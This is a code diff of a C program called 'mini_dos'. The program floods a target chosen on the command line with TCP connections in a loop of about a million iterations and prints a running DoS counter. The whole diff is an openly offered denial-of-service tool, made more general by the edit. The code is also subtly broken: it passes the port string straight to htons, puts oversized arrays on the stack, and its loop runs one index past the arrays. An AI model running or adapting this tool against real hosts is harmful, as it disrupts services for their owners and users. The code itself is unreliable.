@@ -2,21 +2,23 @@
 #include <sys/socket.h>
 #include <netdb.h>
 
-int main(void) {
+// Usage: ./mini_dos [IP] [PORT]
+
+int main(int argc, char const *argv[]) {
 	int s;
 	int connection;
 
 	struct sockaddr_in target;
 	target.sin_family = AF_INET;	// AF_INET : TCP
-	target.sin_port = htons(21);	// Port 21: FTP
-	target.sin_addr.s_addr = inet_addr("TARGET IP"); // inet_addr translate address.
+	target.sin_port = htons(argv[2]);	// Port
+	target.sin_addr.s_addr = inet_addr(argv[1]); // inet_addr translate address.
 
-	int actual_sockets[10000];
-	int actual_conns[10000];
-	for (int i = 0;i <= 100000; i++) {
+	int actual_sockets[999999];
+	int actual_conns[999999];
+	for (int i = 0;i <= 999999; i++) {
 		actual_sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
 		actual_conns[i] = connect(actual_sockets[i], (struct sockaddr *)&target, sizeof target); // Connection
-		printf("[!] Running DoS | Sockets: %d\n", i);
+		printf("[!] Running DoS against %s | Sockets: %d\n", argv[1], i);
 	}
 	return 0;
 }
